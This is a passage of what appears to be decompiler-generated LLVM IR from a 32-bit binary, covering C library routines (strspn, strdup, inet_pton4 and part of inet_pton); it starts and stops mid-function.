  %v0_804fd5e = phi i32 [ %v1_804fd54, %dec_label_pc_804fd54 ], [ %v1_804fd4c, %dec_label_pc_804fd4c ], [ %v1_804fd44, %dec_label_pc_804fd44 ], [ %v0_804fd28, %dec_label_pc_804fd3c ], [ %v0_804fd0c, %dec_label_pc_804fd08 ]
  store i32 %v0_804fcfd, i32* @ebx, align 4
  ret i32 %v0_804fd5e

; uselistorder directives
  uselistorder i32 %v1_804fd28, { 1, 0 }
  uselistorder i32 %v2_804fd1b, { 1, 0 }
  uselistorder i32 %v1_804fd0c, { 1, 0, 2 }
  uselistorder i8 %v4_804fd08, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_804fd02, { 2, 1, 0 }
  uselistorder i32 %v4_804fcfe, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fd5c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804fd11, { 1, 0 }
  uselistorder label %dec_label_pc_804fd08, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_804fd8231 = load i8, i8* %arg1, align 1
  %v4_804fd8435 = icmp eq i8 %v2_804fd8231, 0
  br i1 %v4_804fd8435, label %dec_label_pc_804fd8c, label %dec_label_pc_804fd88.lr.ph

dec_label_pc_804fd88.lr.ph:                       ; preds = %entry
  %v3_804fd8232 = zext i8 %v2_804fd8231 to i32
  %v4_804fd82.pre = load i32, i32* @eax, align 4
  %v5_804fd8233 = and i32 %v4_804fd82.pre, -256
  %v6_804fd8234 = or i32 %v3_804fd8232, %v5_804fd8233
  %v4_804fd69 = ptrtoint i8* %arg1 to i32
  %v1_804fd7418 = inttoptr i32 %arg2 to i8*
  %v4_804fd74.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804fd88

dec_label_pc_804fd6f:                             ; preds = %dec_label_pc_804fd88, %dec_label_pc_804fd73
  %v6_804fd7428 = phi i32 [ %v6_804fd74, %dec_label_pc_804fd73 ], [ %v6_804fd7422, %dec_label_pc_804fd88 ]
  %v2_804fd7427 = phi i8 [ %v2_804fd74, %dec_label_pc_804fd73 ], [ %v2_804fd7419, %dec_label_pc_804fd88 ]
  %v0_804fd7326 = phi i32 [ %v1_804fd73, %dec_label_pc_804fd73 ], [ %arg2, %dec_label_pc_804fd88 ]
  %v15_804fd6f = icmp eq i8 %v2_804fd8239, %v2_804fd7427
  br i1 %v15_804fd6f, label %dec_label_pc_804fd7c, label %dec_label_pc_804fd73

dec_label_pc_804fd73:                             ; preds = %dec_label_pc_804fd6f
  %v1_804fd73 = add i32 %v0_804fd7326, 1
  store i32 %v1_804fd73, i32* @edx, align 4
  %v1_804fd74 = inttoptr i32 %v1_804fd73 to i8*
  %v2_804fd74 = load i8, i8* %v1_804fd74, align 1
  %v3_804fd74 = zext i8 %v2_804fd74 to i32
  %v5_804fd74 = and i32 %v6_804fd7428, -256
  %v6_804fd74 = or i32 %v3_804fd74, %v5_804fd74
  store i32 %v6_804fd74, i32* @ecx, align 4
  %v4_804fd76 = icmp eq i8 %v2_804fd74, 0
  %v1_804fd78 = icmp eq i1 %v4_804fd76, false
  br i1 %v1_804fd78, label %dec_label_pc_804fd6f, label %dec_label_pc_804fd8c

dec_label_pc_804fd7c:                             ; preds = %dec_label_pc_804fd6f
  %v1_804fd80 = add i32 %v0_804fd8d37, 1
  %v1_804fd81 = add i32 %v0_804fd8138, 1
  %v1_804fd82 = inttoptr i32 %v1_804fd81 to i8*
  %v2_804fd82 = load i8, i8* %v1_804fd82, align 1
  %v3_804fd82 = zext i8 %v2_804fd82 to i32
  %v5_804fd82 = and i32 %v6_804fd8240, -256
  %v6_804fd82 = or i32 %v3_804fd82, %v5_804fd82
  %v4_804fd84 = icmp eq i8 %v2_804fd82, 0
  br i1 %v4_804fd84, label %dec_label_pc_804fd8c, label %dec_label_pc_804fd88

dec_label_pc_804fd88:                             ; preds = %dec_label_pc_804fd88.lr.ph, %dec_label_pc_804fd7c
  %v4_804fd74.pre = phi i32 [ %v4_804fd74.pre.pre, %dec_label_pc_804fd88.lr.ph ], [ %v6_804fd7428, %dec_label_pc_804fd7c ]
  %v6_804fd8240 = phi i32 [ %v6_804fd8234, %dec_label_pc_804fd88.lr.ph ], [ %v6_804fd82, %dec_label_pc_804fd7c ]
  %v2_804fd8239 = phi i8 [ %v2_804fd8231, %dec_label_pc_804fd88.lr.ph ], [ %v2_804fd82, %dec_label_pc_804fd7c ]
  %v0_804fd8138 = phi i32 [ %v4_804fd69, %dec_label_pc_804fd88.lr.ph ], [ %v1_804fd81, %dec_label_pc_804fd7c ]
  %v0_804fd8d37 = phi i32 [ 0, %dec_label_pc_804fd88.lr.ph ], [ %v1_804fd80, %dec_label_pc_804fd7c ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804fd7419 = load i8, i8* %v1_804fd7418, align 1
  %v3_804fd7420 = zext i8 %v2_804fd7419 to i32
  %v5_804fd7421 = and i32 %v4_804fd74.pre, -256
  %v6_804fd7422 = or i32 %v3_804fd7420, %v5_804fd7421
  store i32 %v6_804fd7422, i32* @ecx, align 4
  %v4_804fd7623 = icmp eq i8 %v2_804fd7419, 0
  %v1_804fd7825 = icmp eq i1 %v4_804fd7623, false
  br i1 %v1_804fd7825, label %dec_label_pc_804fd6f, label %dec_label_pc_804fd8c

dec_label_pc_804fd8c:                             ; preds = %entry, %dec_label_pc_804fd7c, %dec_label_pc_804fd88, %dec_label_pc_804fd73
  %v0_804fd8d17 = phi i32 [ %v0_804fd8d37, %dec_label_pc_804fd73 ], [ %v0_804fd8d37, %dec_label_pc_804fd88 ], [ 0, %entry ], [ %v1_804fd80, %dec_label_pc_804fd7c ]
  ret i32 %v0_804fd8d17

; uselistorder directives
  uselistorder i32 %v6_804fd7422, { 1, 0 }
  uselistorder i8 %v2_804fd7419, { 1, 2, 0 }
  uselistorder i32 %v1_804fd81, { 1, 0 }
  uselistorder i32 %v6_804fd74, { 1, 0 }
  uselistorder i8 %v2_804fd74, { 1, 2, 0 }
  uselistorder i32 %v1_804fd73, { 2, 1, 0 }
  uselistorder i8 %v2_804fd8231, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fd8c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804fd88, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fd94 = load i32, i32* @edi, align 4
  %v0_804fd95 = load i32, i32* @esi, align 4
  %v0_804fd96 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd96, i32* %stack_var_-12, align 4
  %v4_804fd97 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fd97, i32* @edi, align 4
  %v3_804fd9f = call i32 @strlen(i8* %arg1)
  %v1_804fda4 = add i32 %v3_804fd9f, 1
  store i32 %v1_804fda4, i32* @esi, align 4
  %v2_804fdaa = call i32 @malloc(i32 %v1_804fda4)
  %v1_804fdb2 = icmp eq i32 %v2_804fdaa, 0
  store i32 %v2_804fdaa, i32* %ebx.global-to-local, align 4
  br i1 %v1_804fdb2, label %dec_label_pc_804fdc4, label %dec_label_pc_804fdb8

dec_label_pc_804fdb8:                             ; preds = %entry
  %v0_804fdb9 = load i32, i32* @esi, align 4
  %v0_804fdba = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_804fdaa to i16*
  %v6_804fdbc = call i32 @memcpy(i16* %tmp12, i32 %v0_804fdba, i32 %v0_804fdb9)
  %v0_804fdc4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fdc4

dec_label_pc_804fdc4:                             ; preds = %entry, %dec_label_pc_804fdb8
  %v0_804fdc4 = phi i32 [ 0, %entry ], [ %v0_804fdc4.pre, %dec_label_pc_804fdb8 ]
  %v2_804fdc6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fdc6, i32* @ebx, align 4
  store i32 %v0_804fd95, i32* @esi, align 4
  store i32 %v0_804fd94, i32* @edi, align 4
  ret i32 %v0_804fdc4

; uselistorder directives
  uselistorder i32 %v2_804fdaa, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 5, 2, 0, 14, 13, 12, 1, 4, 3, 11, 10, 9, 8, 7, 6 }
  uselistorder label %dec_label_pc_804fdc4, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_804fdd2 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_804fdd5 = load i32, i32* @ebx, align 4
  store i32 %v0_804fdd5, i32* %stack_var_-16, align 4
  %v0_804fdd6 = load i32, i32* @eax, align 4
  store i32 %v0_804fdd6, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_804fdd8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804fddb = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fddb, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804fe2315 = inttoptr i32 %v0_804fdd6 to i8*
  %v2_804fe2316 = load i8, i8* %v1_804fe2315, align 1
  %v3_804fe2317 = sext i8 %v2_804fe2316 to i32
  store i32 %v3_804fe2317, i32* @ecx, align 4
  %v1_804fe2618 = add i32 %v0_804fdd6, 1
  store i32 %v1_804fe2618, i32* %ebx.global-to-local, align 4
  %v1_804fe2719 = icmp eq i8 %v2_804fe2316, 0
  store i1 %v1_804fe2719, i1* %zf.global-to-local, align 1
  %v1_804fe2921 = icmp eq i1 %v1_804fe2719, false
  br i1 %v1_804fe2921, label %dec_label_pc_804fde6, label %dec_label_pc_804fe2b

dec_label_pc_804fde6:                             ; preds = %entry, %dec_label_pc_804fe23.backedge
  %v3_804fe2323 = phi i32 [ %v3_804fe23, %dec_label_pc_804fe23.backedge ], [ %v3_804fe2317, %entry ]
  %v2_804fe2322 = phi i8 [ %v2_804fe23, %dec_label_pc_804fe23.backedge ], [ %v2_804fe2316, %entry ]
  %v1_804fde6 = add nsw i32 %v3_804fe2323, -48
  store i32 %v1_804fde6, i32* @eax, align 4
  %v9_804fde9 = icmp eq i8 %v2_804fe2322, 57
  store i1 %v9_804fde9, i1* %zf.global-to-local, align 1
  %v6_804fdec = icmp ugt i32 %v1_804fde6, 9
  br i1 %v6_804fdec, label %dec_label_pc_804fe0f, label %dec_label_pc_804fdee

dec_label_pc_804fdee:                             ; preds = %dec_label_pc_804fde6
  %v0_804fdee = load i32, i32* @esi, align 4
  %v1_804fdee = inttoptr i32 %v0_804fdee to i8*
  %v2_804fdee = load i8, i8* %v1_804fdee, align 1
  %v2_804fdf1 = zext i8 %v2_804fdee to i32
  %v3_804fdf1 = mul nuw nsw i32 %v2_804fdf1, 10
  %v3_804fdf4 = add nsw i32 %v3_804fdf1, %v1_804fde6
  store i32 %v3_804fdf4, i32* @eax, align 4
  %v9_804fdf8 = icmp eq i32 %v3_804fdf4, 255
  store i1 %v9_804fdf8, i1* %zf.global-to-local, align 1
  %v6_804fdfd = icmp ugt i32 %v3_804fdf4, 255
  br i1 %v6_804fdfd, label %dec_label_pc_804fe48, label %dec_label_pc_804fdff

dec_label_pc_804fdff:                             ; preds = %dec_label_pc_804fdee
  %v0_804fdff = load i32, i32* @edx, align 4
  %v1_804fdff = icmp eq i32 %v0_804fdff, 0
  store i1 %v1_804fdff, i1* %zf.global-to-local, align 1
  %v1_804fe01 = trunc i32 %v3_804fdf4 to i8
  store i8 %v1_804fe01, i8* %v1_804fdee, align 1
  %v0_804fe03 = load i1, i1* %zf.global-to-local, align 1
  %v1_804fe03 = icmp eq i1 %v0_804fe03, false
  br i1 %v1_804fe03, label %dec_label_pc_804fe23.backedge, label %dec_label_pc_804fe05

dec_label_pc_804fe05:                             ; preds = %dec_label_pc_804fdff
  %v0_804fe05 = load i32, i32* @edi, align 4
  %v1_804fe05 = add i32 %v0_804fe05, 1
  store i32 %v1_804fe05, i32* @edi, align 4
  %v1_804fe06 = add i32 %v0_804fe05, -3
  %v6_804fe06 = sub i32 2, %v0_804fe05
  %v7_804fe06 = and i32 %v6_804fe06, %v1_804fe05
  %v8_804fe06 = icmp slt i32 %v7_804fe06, 0
  %v9_804fe06 = icmp eq i32 %v1_804fe06, 0
  store i1 %v9_804fe06, i1* %zf.global-to-local, align 1
  %v10_804fe06 = icmp slt i32 %v1_804fe06, 0
  %v3_804fe09 = icmp eq i1 %v10_804fe06, %v8_804fe06
  %v4_804fe09 = icmp eq i1 %v9_804fe06, false
  %v5_804fe09 = and i1 %v4_804fe09, %v3_804fe09
  br i1 %v5_804fe09, label %dec_label_pc_804fe48, label %dec_label_pc_804fe0b

dec_label_pc_804fe0b:                             ; preds = %dec_label_pc_804fe05
  %v0_804fe0b = load i32, i32* @edx, align 4
  %v1_804fe0b = and i32 %v0_804fe0b, -256
  %v2_804fe0b = or i32 %v1_804fe0b, 1
  store i32 %v2_804fe0b, i32* @edx, align 4
  br label %dec_label_pc_804fe23.backedge

dec_label_pc_804fe0f:                             ; preds = %dec_label_pc_804fde6
  %v9_804fe0f = icmp eq i8 %v2_804fe2322, 46
  store i1 %v9_804fe0f, i1* %zf.global-to-local, align 1
  %v1_804fe12 = icmp eq i1 %v9_804fe0f, false
  br i1 %v1_804fe12, label %dec_label_pc_804fe48, label %dec_label_pc_804fe14

dec_label_pc_804fe14:                             ; preds = %dec_label_pc_804fe0f
  %v0_804fe14 = load i32, i32* @edx, align 4
  %v1_804fe14 = icmp eq i32 %v0_804fe14, 0
  store i1 %v1_804fe14, i1* %zf.global-to-local, align 1
  br i1 %v1_804fe14, label %dec_label_pc_804fe48, label %dec_label_pc_804fe18

dec_label_pc_804fe18:                             ; preds = %dec_label_pc_804fe14
  %v0_804fe18 = load i32, i32* @edi, align 4
  %v9_804fe18 = icmp eq i32 %v0_804fe18, 4
  store i1 %v9_804fe18, i1* %zf.global-to-local, align 1
  br i1 %v9_804fe18, label %dec_label_pc_804fe48, label %dec_label_pc_804fe1d

dec_label_pc_804fe1d:                             ; preds = %dec_label_pc_804fe18
  %v0_804fe1d = load i32, i32* @esi, align 4
  %v1_804fe1d = add i32 %v0_804fe1d, 1
  store i32 %v1_804fe1d, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_804fe20 = inttoptr i32 %v1_804fe1d to i8*
  store i8 0, i8* %v1_804fe20, align 1
  br label %dec_label_pc_804fe23.backedge

dec_label_pc_804fe23.backedge:                    ; preds = %dec_label_pc_804fe1d, %dec_label_pc_804fe0b, %dec_label_pc_804fdff
  %v0_804fe23.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fe23 = inttoptr i32 %v0_804fe23.pre to i8*
  %v2_804fe23 = load i8, i8* %v1_804fe23, align 1
  %v3_804fe23 = sext i8 %v2_804fe23 to i32
  store i32 %v3_804fe23, i32* @ecx, align 4
  %v1_804fe26 = add i32 %v0_804fe23.pre, 1
  store i32 %v1_804fe26, i32* %ebx.global-to-local, align 4
  %v1_804fe27 = icmp eq i8 %v2_804fe23, 0
  store i1 %v1_804fe27, i1* %zf.global-to-local, align 1
  %v1_804fe29 = icmp eq i1 %v1_804fe27, false
  br i1 %v1_804fe29, label %dec_label_pc_804fde6, label %dec_label_pc_804fe23.dec_label_pc_804fe2b_crit_edge

dec_label_pc_804fe23.dec_label_pc_804fe2b_crit_edge: ; preds = %dec_label_pc_804fe23.backedge
  %v0_804fe2b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fe2b

dec_label_pc_804fe2b:                             ; preds = %dec_label_pc_804fe23.dec_label_pc_804fe2b_crit_edge, %entry
  %v0_804fe2b = phi i32 [ %v0_804fe2b.pre, %dec_label_pc_804fe23.dec_label_pc_804fe2b_crit_edge ], [ 0, %entry ]
  %v10_804fe2b = icmp eq i32 %v0_804fe2b, 3
  store i1 %v10_804fe2b, i1* %zf.global-to-local, align 1
  %v7_804fe2e = icmp sgt i32 %v0_804fe2b, 3
  br i1 %v7_804fe2e, label %dec_label_pc_804fe30, label %dec_label_pc_804fe48

dec_label_pc_804fe30:                             ; preds = %dec_label_pc_804fe2b
  %v0_804fe30 = load i32, i32* @eax, align 4
  %v3_804fe39 = bitcast i32* %stack_var_-20 to i16*
  %v4_804fe39 = call i32 @memcpy(i16* %v3_804fe39, i32 4, i32 %v0_804fe30)
  %v0_804fe43 = load i32, i32* @esp, align 4
  %v6_804fe43 = icmp eq i32 %v0_804fe43, -16
  store i1 %v6_804fe43, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804fe4a

dec_label_pc_804fe48:                             ; preds = %dec_label_pc_804fe18, %dec_label_pc_804fe14, %dec_label_pc_804fe0f, %dec_label_pc_804fe05, %dec_label_pc_804fdee, %dec_label_pc_804fe2b
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_804fe4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fe4a

dec_label_pc_804fe4a:                             ; preds = %dec_label_pc_804fe30, %dec_label_pc_804fe48
  %v0_804fe4a = phi i32 [ %v15_804fdd8, %dec_label_pc_804fe30 ], [ %v0_804fe4a.pre, %dec_label_pc_804fe48 ]
  %v0_804fe51 = phi i32 [ 1, %dec_label_pc_804fe30 ], [ 0, %dec_label_pc_804fe48 ]
  %v9_804fe4a = icmp eq i32 %v0_804fe4a, -28
  store i1 %v9_804fe4a, i1* %zf.global-to-local, align 1
  %v2_804fe4d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fe4d, i32* @ebx, align 4
  store i32 %v0_804fdd2, i32* @esi, align 4
  ret i32 %v0_804fe51

; uselistorder directives
  uselistorder i32 %v0_804fe2b, { 1, 0 }
  uselistorder i32 %v3_804fe23, { 1, 0 }
  uselistorder i8 %v2_804fe23, { 1, 2, 0 }
  uselistorder i1 %v9_804fe18, { 1, 0 }
  uselistorder i32 %v1_804fe06, { 1, 0 }
  uselistorder i32 %v3_804fdf4, { 1, 2, 0, 3 }
  uselistorder i8 %v2_804fe2322, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32 255, { 4, 2, 1, 0, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_804fe4a, { 1, 0 }
  uselistorder label %dec_label_pc_804fe48, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804fde6, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804fe52 = load i32, i32* @ebp, align 4
  %v0_804fe53 = load i32, i32* @edi, align 4
  %v0_804fe54 = load i32, i32* @esi, align 4
  %v0_804fe55 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804fe5d = ptrtoint i8* %arg2 to i32
  store i32 %v4_804fe5d, i32* @edi, align 4
  %v9_804fe61 = icmp eq i32 %arg1, 2
  br i1 %v9_804fe61, label %dec_label_pc_804fe71, label %dec_label_pc_804fe66

dec_label_pc_804fe66:                             ; preds = %entry
  %v9_804fe66 = icmp eq i32 %arg1, 10
  %v1_804fe69 = icmp eq i1 %v9_804fe66, false
  br i1 %v1_804fe69, label %dec_label_pc_8050002, label %dec_label_pc_804fe81

dec_label_pc_804fe71:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_804fe5d, i32* @eax, align 4
  %v3_804fe77 = call i32 @inet_pton4(i32 %v0_804fe55, i32 %v0_804fe54, i32 %v0_804fe53)
  store i32 %v3_804fe77, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050014

dec_label_pc_804fe81:                             ; preds = %dec_label_pc_804fe66
  %v2_804fe86 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fe86, i32* %eax.global-to-local, align 4
  %tmp60 = bitcast i32* %stack_var_-32 to i8*
  %v5_804fe8b = call i32 @__GI_memset(i8* %tmp60, i32 0, i32 16)
  store i32 %v5_804fe8b, i32* @ebx, align 4
  %v2_804fe92 = add i32 %v5_804fe8b, 16
  store i32 %v2_804fe92, i32* %eax.global-to-local, align 4
  %v0_804fe9c = load i32, i32* @edi, align 4
  %v1_804fe9c = inttoptr i32 %v0_804fe9c to i8*
  %v2_804fe9c = load i8, i8* %v1_804fe9c, align 1
  %v11_804fe9c = icmp eq i8 %v2_804fe9c, 58
  %v1_804fe9f = icmp eq i1 %v11_804fe9c, false
  br i1 %v1_804fe9f, label %dec_label_pc_804ff32, label %dec_label_pc_804fea1

dec_label_pc_804fea1:                             ; preds = %dec_label_pc_804fe81
  %v1_804fea1 = add i32 %v0_804fe9c, 1
  store i32 %v1_804fea1, i32* @edi, align 4
  %v1_804fea2 = inttoptr i32 %v1_804fea1 to i8*
  %v2_804fea2 = load i8, i8* %v1_804fea2, align 1
  %v11_804fea2 = icmp eq i8 %v2_804fea2, 58
  %v1_804fea5 = icmp eq i1 %v11_804fea2, false
  br i1 %v1_804fea5, label %dec_label_pc_8050012, label %dec_label_pc_804ff32

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804ff72
  %v0_804feb9 = load i32, i32* @ecx, align 4
  %v0_804feba = load i32, i32* @edi, align 4
  %v1_804feba = add i32 %v0_804feba, 1
  store i32 %v1_804feba, i32* @edi, align 4
  %v7_804fec2 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8052dd4.413, i32 0, i32 0), i32 %v2_804ff79, i32 %v0_804feb9, i32 %v0_804feb9)
  store i32 %v7_804fec2, i32* %eax.global-to-local, align 4
  %v1_804feca = icmp eq i32 %v7_804fec2, 0
  br i1 %v1_804feca, label %dec_label_pc_804fee9, label %dec_label_pc_804fece

dec_label_pc_804fece:                             ; preds = %dec_label_pc_804feb9
  %v0_804fece = load i32, i32* @ebp, align 4
  %v2_804fece = mul i32 %v0_804fece, 16
  %v1_804fed1 = add i32 %v7_804fec2, -134557140
  store i32 %v1_804fed1, i32* %eax.global-to-local, align 4
  %v2_804fed6 = or i32 %v2_804fece, %v1_804fed1
  store i32 %v2_804fed6, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_804fed6, 65536
  br i1 %tmp, label %dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge, label %dec_label_pc_8050012

dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge: ; preds = %dec_label_pc_804fece
  %v0_804ff72.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ff72.outer

dec_label_pc_804ff72.outer:                       ; preds = %dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge, %dec_label_pc_804ff32
  %v0_804ff72.pre = phi i32 [ %v0_804ff72.pre.pre, %dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_804ff32 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_804ff32 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_804ff32 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_804fece.dec_label_pc_804ff72.outer_crit_edge ], [ 0, %dec_label_pc_804ff32 ]
  %v4_804feee = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_804fef3 = icmp eq i1 %v4_804feee, false
  br label %dec_label_pc_804ff72

dec_label_pc_804fee9:                             ; preds = %dec_label_pc_804feb9
  %v0_804fee9 = load i32, i32* @esi, align 4
  %v9_804fee9 = icmp eq i32 %v0_804fee9, 58
  %v1_804feec = icmp eq i1 %v9_804fee9, false
  br i1 %v1_804feec, label %dec_label_pc_804ff3e, label %dec_label_pc_804feee

dec_label_pc_804feee:                             ; preds = %dec_label_pc_804fee9
  br i1 %v1_804fef3, label %dec_label_pc_804ff0a, label %dec_label_pc_804fef5

dec_label_pc_804fef5:                             ; preds = %dec_label_pc_804feee
  %v5_804fef5 = icmp eq i8* %stack_var_-44.1, null
  %v1_804fefa = icmp eq i1 %v5_804fef5, false
  br i1 %v1_804fefa, label %dec_label_pc_8050012, label %dec_label_pc_804ff00

dec_label_pc_804ff00:                             ; preds = %dec_label_pc_804fef5
  %v0_804ff00 = load i32, i32* @ebx, align 4
  %v5_804ff00 = inttoptr i32 %v0_804ff00 to i8*
  %v0_804ff04 = load i32, i32* @edi, align 4
  %v5_804ff04 = inttoptr i32 %v0_804ff04 to i8*
  br label %dec_label_pc_804ff72

dec_label_pc_804ff0a:                             ; preds = %dec_label_pc_804feee
  %v0_804ff0a = load i32, i32* @edi, align 4
  %v1_804ff0a = inttoptr i32 %v0_804ff0a to i8*
  %v2_804ff0a = load i8, i8* %v1_804ff0a, align 1
  %v3_804ff0a = icmp eq i8 %v2_804ff0a, 0
  br i1 %v3_804ff0a, label %dec_label_pc_8050012, label %dec_label_pc_804ff13

dec_label_pc_804ff13:                             ; preds = %dec_label_pc_804ff0a
  %v0_804ff13 = load i32, i32* @ebx, align 4
  %v1_804ff13 = add i32 %v0_804ff13, 2
  store i32 %v1_804ff13, i32* @edx, align 4
  %v6_804ff1a = icmp ugt i32 %v1_804ff13, %v2_804fe92
  br i1 %v6_804ff1a, label %dec_label_pc_8050012, label %dec_label_pc_804ff20

dec_label_pc_804ff20:                             ; preds = %dec_label_pc_804ff13
  %v0_804ff20 = load i32, i32* @ebp, align 4
  %v2_804ff22 = udiv i32 %v0_804ff20, 256
  %v4_804ff22 = trunc i32 %v2_804ff22 to i8
  %v3_804ff25 = inttoptr i32 %v0_804ff13 to i8*
  store i8 %v4_804ff22, i8* %v3_804ff25, align 1
  %v0_804ff27 = load i32, i32* @ebp, align 4
  store i32 %v0_804ff27, i32* %eax.global-to-local, align 4
  %v1_804ff29 = trunc i32 %v0_804ff27 to i8
  %v2_804ff29 = load i32, i32* @ebx, align 4
  %v3_804ff29 = add i32 %v2_804ff29, 1
  %v4_804ff29 = inttoptr i32 %v3_804ff29 to i8*
  store i8 %v1_804ff29, i8* %v4_804ff29, align 1
  %v0_804ff2c = load i32, i32* @edx, align 4
  store i32 %v0_804ff2c, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ff32

dec_label_pc_804ff32:                             ; preds = %dec_label_pc_804fe81, %dec_label_pc_804fea1, %dec_label_pc_804ff20
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_804ff20 ], [ %v1_804fea1, %dec_label_pc_804fea1 ], [ %v0_804fe9c, %dec_label_pc_804fe81 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_804ff20 ], [ null, %dec_label_pc_804fea1 ], [ null, %dec_label_pc_804fe81 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804ff72.outer

dec_label_pc_804ff3e:                             ; preds = %dec_label_pc_804fee9
  %v9_804ff3e = icmp eq i32 %v0_804fee9, 46
  %v1_804ff41 = icmp eq i1 %v9_804ff3e, false
  br i1 %v1_804ff41, label %dec_label_pc_8050012, label %dec_label_pc_804ff47

dec_label_pc_804ff47:                             ; preds = %dec_label_pc_804ff3e
  %v0_804ff47 = load i32, i32* @ebx, align 4
  %v1_804ff47 = add i32 %v0_804ff47, 4
  store i32 %v1_804ff47, i32* @esi, align 4
  %v6_804ff4e = icmp ugt i32 %v1_804ff47, %v2_804fe92
  br i1 %v6_804ff4e, label %dec_label_pc_8050012, label %dec_label_pc_804ff54

dec_label_pc_804ff54:                             ; preds = %dec_label_pc_804ff47
  %v4_804ff54 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_804ff54, i32* @eax, align 4
  store i32 %v0_804ff47, i32* @edx, align 4
  store i32 %v1_804ff47, i32* @ebx, align 4
  %v2_804ff5c = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804ff5c = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_804ff5c, i32 %v2_804fe92)
  store i32 %v5_804ff5c, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_804ff5c, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_804ffa9, label %dec_label_pc_8050012

dec_label_pc_804ff72:                             ; preds = %dec_label_pc_804ff72.outer, %dec_label_pc_804ff00
  %v0_804ff72 = phi i32 [ %v0_804ff04, %dec_label_pc_804ff00 ], [ %v0_804ff72.pre, %dec_label_pc_804ff72.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_804ff00, %dec_label_pc_804ff00 ], [ %stack_var_-44.1.ph, %dec_label_pc_804ff72.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_804ff04, %dec_label_pc_804ff00 ], [ %stack_var_-36.1.ph, %dec_label_pc_804ff72.outer ]
